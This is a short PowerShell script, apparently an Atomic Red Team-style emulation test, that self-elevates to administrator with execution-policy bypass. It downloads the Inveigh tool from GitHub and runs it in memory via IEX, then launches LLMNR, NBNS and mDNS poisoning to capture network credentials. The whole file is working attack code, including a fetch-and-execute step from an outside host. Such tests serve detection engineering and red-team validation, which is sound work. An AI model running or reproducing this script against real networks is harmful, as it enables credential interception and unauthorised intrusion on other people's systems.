#Atomic Test #1 - LLMNR Poisoning with Inveigh (PowerShell)


if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y